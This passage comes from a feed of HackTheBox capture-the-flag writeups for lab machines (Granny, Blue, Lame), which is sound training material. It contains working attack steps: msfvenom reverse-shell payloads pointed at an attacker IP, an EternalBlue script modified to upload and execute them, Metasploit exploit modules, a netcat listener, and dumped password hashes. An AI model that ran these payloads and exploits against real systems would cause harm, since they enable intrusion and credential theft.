<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_htb_optimum/screenshot07.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_htb_optimum/screenshot08.png.webp" />  </p>
<p>3. The <code>windows-exploit-suggester.py</code> scripts lists several privesc vectors and we decide to use <a href="https://www.exploit-db.com/exploits/41020">EDB:41020</a> because it provides a pre-compiled binary ready to used. We again transfer this exploit file to the target system using Powershell:  </p>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_optimum/screenshot09.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_htb_optimum/screenshot10.png.webp" />  </p>
<p>4. Once executed, we get elevated privileges on the target system:  </p>
<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_optimum/screenshot11.png.webp" />  </p>
<p>5. We can now view the contents of the <code>root.txt</code> file to complete the challenge:  </p>
<p><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_htb_optimum/screenshot12.png.webp" />  </p>
<h2>Loot</h2>
<h3>Flags</h3>
<pre><code>C:\Users\kostas\Desktop\user.txt.txt: d0c39409d7b994a9a1..............
C:\Users\Administrator\Desktop\root.txt: 51ed1b36553c8461f4..............
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/6">https://www.hackthebox.eu/home/machines/profile/6</a>  </li>
<li><a href="https://reboare.github.io/hackthebox/htb-optimum.html">https://reboare.github.io/hackthebox/htb-optimum.html</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Granny</title>
      <link>https://7h3ram.github.io/posts/20191104_htb-granny.html</link>
      <guid>https://7h3ram.github.io/posts/20191104_htb-granny.html</guid>
      <pubDate>Mon, 04 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/14">Granny</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_granny/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_granny/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Microsoft IIS httpd 6.0</code>: <a href="https://github.com/7h3rAm/writeups#exploit_iis_webdav">exploit_iis_webdav</a>, <a href="https://github.com/7h3rAm/writeups#privesc_windows_ms15_051">privesc_windows_ms15_051</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Mon Nov  4 13:35:36 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.granny/results/10.10.10.15/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.granny/results/10.10.10.15/scans/xml/_quick_tcp_nmap.xml 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.051s latency).
Scanned at 2019-11-04 13:35:37 PST for 21s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unkown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Mon, 04 Nov 2019 21:36:04 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  4 13:35:58 2019 -- 1 IP address (1 host up) scanned in 21.97 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_granny/openports.png.webp" />  </p>
<p>3. We look for IIS 6.0 vulnerabilities and find multiple WebDAV related hits:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_granny/screenshot01.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>80/tcp  |  http  |  Microsoft IIS httpd 6.0
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We decide to use the Metasploit <code>windows/iis/iis_webdav_upload_asp</code> exploit and it successully gives us a Meterpreter shell:  </p>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_granny/screenshot02.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_granny/screenshot03.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>ntauth/network@GRANNY&gt; id
NT AUTHORITY\NETWORK SERVICE
ntauth/network@GRANNY&gt;  
ntauth/network@GRANNY&gt; uname
Computer        : GRANNY
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
ntauth/network@GRANNY&gt;  
ntauth/network@GRANNY&gt; ifconfig
Ethernet adapter Local Area Connection:
 Connection-specific DNS Suffix  . :
 IP Address. . . . . . . . . . . . : 10.10.10.15
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 10.10.10.2
ntauth/network@GRANNY&gt;  
ntauth/network@GRANNY&gt; users
Administrator
Lakis
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. Since we have certain restrictions that stop us from running commands like <code>getuid</code>, we have to migrate to a different process. We find the PID for process <code>davcdata.exe</code> and migrate to it:  </p>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_granny/screenshot04.png.webp" />  </p>
<p>2. We can now use the Metasploit <code>multi/recon/local_exploit_suggester</code> module to look for privesc options:  </p>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_granny/screenshot05.png.webp" />  </p>
<p>3. We tried a few exploits from this list and eventually the <code>windows/local/ms15_051_client_copy_image</code> module worked and provided an elevated session:  </p>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_granny/screenshot06.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_htb_granny/screenshot07.png.webp" />  </p>
<p>4. We then obtain further information about the system and read the contents of both user.txt and root.txt files to comeplete the challenge:  </p>
<pre><code>cat &quot;C:\Documents and Settings\Lakis\Desktop\user.txt&quot;
cat &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
</code></pre>
<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_granny/screenshot08.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e.................
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f589................
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c...............
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b7.................
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f615.................
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6................
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e..................
</code></pre>
<h3>Flags</h3>
<pre><code>C:\Documents and Settings\Lakis\Desktop\user.txt: 700c5dc163014e22................
C:\Documents and Settings\Administrator\Desktop\root.txt: aa4beed1c05844..................
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/14">https://www.hackthebox.eu/home/machines/profile/14</a>  </li>
<li><a href="https://marcelowoloszyn.cl/hackthebox/hack-the-box-write-up-granny/">https://marcelowoloszyn.cl/hackthebox/hack-the-box-write-up-granny/</a>  </li>
<li><a href="https://reboare.github.io/hackthebox/htb-granny.html">https://reboare.github.io/hackthebox/htb-granny.html</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Blue</title>
      <link>https://7h3ram.github.io/posts/20191101_htb-blue.html</link>
      <guid>https://7h3ram.github.io/posts/20191101_htb-blue.html</guid>
      <pubDate>Fri, 01 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/51">Blue</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_blue/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_blue/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>139/tcp/netbios-ssn/Microsoft Windows netbios-ssn</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_ms17_010">exploit_smb_ms17_010</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Fri Nov  1 17:05:41 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/xml/_quick_tcp_nmap.xml 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.15s latency).
Scanned at 2019-11-01 17:05:41 PDT for 171s
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 57283/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 60472/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2.10:
|_    Message signing enabled but not required
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 17:08:32 2019 -- 1 IP address (1 host up) scanned in 171.43 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_blue/openports.png.webp" />  </p>
<p>3. We find SMB ports to be open on the target system. We run a Nmap NSE script scan to check if the SMB service is vulnerable:  </p>
<pre><code>nmap -p139,445 --script smb-vuln-* --script-args=unsafe=1 10.10.10.40
</code></pre>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_blue/screenshot01.png.webp" />  </p>
<p>4. We find that the target system is missing patches from <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a> bulletin and as such vulnerable. We can use the <a href="https://github.com/worawit/MS17-010">zzz_exploit.py</a> EternalBlue exploit to gain interactive access. But before that we need to determine the target OS version and the name of an active pipe.  </p>
<p>5. We first use Metasploit auxiliary module <code>scanner/smb/smb_version</code> to determine target OS version to be <code>Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)</code>:  </p>
<pre><code>msfconsole
  use auxiliary/scanner/smb/smb_version
  show options
  set RHOSTS 10.10.10.40
  run
</code></pre>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_htb_blue/screenshot02.png.webp" />  </p>
<p>6. Then we use another Metasploit auxiliary module <code>scanner/smb/pipe_auditor</code> to find multiple open pipes <code>\netlogon, \lsarpc, \samr, \browser, \atsvc, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \LSM_API_service, \ntsvcs, \plugplay, \protected_storage, \scerpc, \srvsvc, \trkwks, \W32TIME_ALT, \wkssvc</code>:  </p>
<pre><code>msfconsole
  use auxiliary/scanner/smb/pipe_auditor
  show options
  set RHOSTS 10.10.10.40
  run
</code></pre>
<p><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_htb_blue/screenshot03.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>135/tcp    |  msrpc         |  Microsoft Windows RPC
139/tcp    |  netbios-ssn   |  Microsoft Windows netbios-ssn
445/tcp    |  microsoft-ds  |  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp  |  msrpc         |  Microsoft Windows RPC
49153/tcp  |  msrpc         |  Microsoft Windows RPC
49154/tcp  |  msrpc         |  Microsoft Windows RPC
49155/tcp  |  unknown       |
49156/tcp  |  msrpc         |  Microsoft Windows RPC
49157/tcp  |  msrpc         |  Microsoft Windows RPC
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We now need to create a binary payload file. For this exploit, we will use <code>meterpreter</code> as the payload and then use <code>multi/handler</code> to catch the incoming shell connection. We then slightly tweak the exploit file to first copy the binary payload on to the target system and execute it:  </p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.18 lport=443 -f exe &gt;mtrptr.exe
subl zzz_exploit.py
  def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    print('creating file c:\\pwned.txt on the target')
    tid2 = smbConn.connectTree('C$')
    fid2 = smbConn.createFile(tid2, '/pwned.txt')
    smbConn.closeFile(tid2, fid2)
    smbConn.disconnectTree(tid2)
    + smb_send_file(smbConn, '/root/toolbox/writeups/htb.blue/mtrptr.exe', 'C', '/mtrptr.exe')
    + service_exec(conn, r'cmd /c c:\\mtrptr.exe')
msfconsole
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set lhost 10.10.14.18
  set lport 443
  set ExitOnSession false
  exploit -j
python zzz_exploit.py 10.10.10.40 netlogon
msfconsole
  sessions -i 1
  getuid
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_blue/screenshot04.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_blue/screenshot05.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_htb_blue/screenshot06.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.4" src="/static/files/posts_htb_blue/screenshot07.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.5" src="/static/files/posts_htb_blue/screenshot08.png.webp" />  </p>
<p>2. We then obtain further information about the system and read the contents of both user.txt and root.txt files to comeplete the challenge:  </p>
<pre><code>sysinfo
cat C:\Users\haris\Desktop\user.txt
cat C:\Users\haris\Desktop\root.txt
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_blue/screenshot09.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_blue/screenshot10.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_blue/screenshot11.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>ntauth/system@HARIS-PC&gt; id
NT AUTHORITY\SYSTEM
ntauth/system@HARIS-PC&gt;  
ntauth/system@HARIS-PC&gt; uname
Computer        : HARIS-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
ntauth/system@HARIS-PC&gt;  
ntauth/system@HARIS-PC&gt; ifconfig
Ethernet adapter Local Area Connection:
  Connection-specific DNS Suffix  . :
  IPv6 Address. . . . . . . . . . . : dead:beef::c530:b184:97a4:fd67
  Temporary IPv6 Address. . . . . . : dead:beef::4d8e:bdfd:4c8b:3189
  Link-local IPv6 Address . . . . . : fe80::c530:b184:97a4:fd67%11
  IPv4 Address. . . . . . . . . . . : 10.10.10.40
  Subnet Mask . . . . . . . . . . . : 255.255.255.0
  Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:db57%11
                                      10.10.10.2
ntauth/system@HARIS-PC&gt;  
ntauth/system@HARIS-PC&gt; users
Administrator
haris
</code></pre>
<h2>Loot</h2>
<h3>Flags</h3>
<pre><code>C:\Users\haris\Desktop\user.txt: 4c546aea7dbee75cbd7.............
C:\Users\Administrator\Desktop\root.txt: ff548eb71e920ff6c0..............
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/51">https://www.hackthebox.eu/home/machines/profile/51</a>  </li>
<li><a href="https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125">https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Lame</title>
      <link>https://7h3ram.github.io/posts/20191101_htb-lame.html</link>
      <guid>https://7h3ram.github.io/posts/20191101_htb-lame.html</guid>
      <pubDate>Fri, 01 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="htps://www.hackthebox.eu/home/machines/profile/1">Lame</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_lame/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_lame/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>139/tcp/netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_usermap">exploit_smb_usermap</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Fri Nov  1 12:30:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/_quick_tcp_nmap.xml 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.26s latency).
Scanned at 2019-11-01 12:30:13 PDT for 94s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h00m15s, deviation: 0s, median: 4h00m15s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 22727/tcp): CLEAN (Timeout)
|   Check 3 (port 47197/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-11-01T15:31:21-04:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 12:31:47 2019 -- 1 IP address (1 host up) scanned in 93.91 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_lame/openports.png.webp" />  </p>
<p>3. We find that the <code>vsftpd</code> service allows anonymous logins and as such connect to it but don't find anything inetresting there. We however find a MSF exploit for the <code>vsftpd</code> version <code>2.3.4</code>. This exploit failed to obtain a session:  </p>
<pre><code>ftp 10.10.10.3
msfconsole
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOST 10.10.10.3
  show options
  exploit
</code></pre>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_lame/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_htb_lame/screenshot02.png.webp" />  </p>
<p>4. We then explore the open (read+write) SMB share <code>tmp</code> but since there is no service (like HTTP for example) to leverage uploaded files, we move on:  </p>
<pre><code>smbclient \\\\10.10.10.3\\tmp
  dir
</code></pre>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_lame/screenshot03.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>21/tcp   |  ftp          |  vsftpd 2.3.4
22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  |  netbios-ssn  |  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. From the Nmap scan results we know that the SMB service version is <code>3.0.20-Debian</code> and upon searching for this version we come across the popular <code>usermap_script</code> exploit. There's a <a href="https://github.com/amriunix/CVE-2007-2447">Python script</a> for this exploit on GitHub. We follow the exploit instructions and gain a shell with elevated privileges on the target system:  </p>
<pre><code>nc -nlvp 443
python usermap_script.py 10.10.10.3 139 10.10.14.18 443
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_lame/screenshot04.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_lame/screenshot05.png.webp" />  </p>
<p>2. We then read the contents of both <code>user.txt</code> and <code>root.txt</code> files to complete the challenge:  </p>
<pre><code>cat /home/makis/user.txt
cat /root/root.txt
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_lame/screenshot06.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>root@lame&gt; id
uid=0(root) gid=0(root)
root@lame&gt;  
root@lame&gt; uname
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
root@lame&gt;  
root@lame&gt; ifconfig
eth0  Link encap:Ethernet  HWaddr 00:50:56:b9:f5:91
      inet addr:10.10.10.3  Bcast:10.10.10.255  Mask:255.255.255.0
      inet6 addr: dead:beef::250:56ff:feb9:f591/64 Scope:Global
      inet6 addr: fe80::250:56ff:feb9:f591/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:146904 errors:9 dropped:15 overruns:0 frame:0
      TX packets:7368 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:9465045 (9.0 MB)  TX bytes:1025713 (1001.6 KB)
      Interrupt:19 Base address:0x2000
root@lame&gt;  
root@lame&gt; users
root
makis
</code></pre>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:............
sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0...........
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:............
postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:............
service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:............
makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:............
</code></pre>
<h3>Flags</h3>
<pre><code>/home/makis/user.txt: 69454a937d94f5f0225ea...........
/root/root.txt: 92caac3be140ef409e4572..........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/1">https://www.hackthebox.eu/home/machines/profile/1</a>  </li>
<li><a href="https://hackingresources.com/lame-hackthebox-walkthrough/">https://hackingresources.com/lame-hackthebox-walkthrough/</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[HackTheBox] Legacy</title>
      <link>https://7h3ram.github.io/posts/20191101_htb-legacy.html</link>
      <guid>https://7h3ram.github.io/posts/20191101_htb-legacy.html</guid>
      <pubDate>Fri, 01 Nov 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/2">Legacy</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_legacy/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_legacy/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>139/tcp/netbios-ssn/Microsoft Windows netbios-ssn</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_ms08_067">exploit_smb_ms08_067</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
